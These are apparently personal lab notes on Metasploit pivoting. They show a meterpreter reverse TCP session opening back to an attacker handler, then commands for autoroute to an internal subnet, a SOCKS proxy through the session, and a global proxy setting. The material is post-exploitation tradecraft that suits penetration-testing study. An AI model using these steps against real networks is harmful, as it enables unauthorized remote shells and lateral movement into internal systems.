# Setting up Meterpreter
Tags: 
#socks_proxy

### Getting meterpreter shell:

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:8080 
[*] Sending stage (3008420 bytes) to 10.10.110.100
[*] Meterpreter session 2 opened (10.10.14.4:8080 -> 10.10.110.100:44088) at 2020-12-22 10:08:46 +0200

meterpreter > 

```

### Setting up autoroute

```
use post/multi/manage/autoroute
set SUBNET 172.16.1.0/24
set SESSION 1
run
```

### Setting up SOCKS proxy

```
use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

run
```

### Setting up Metasploit with other SOCKS Proxy

```
setg PROXIES socks5:127.0.0.1:1088
```

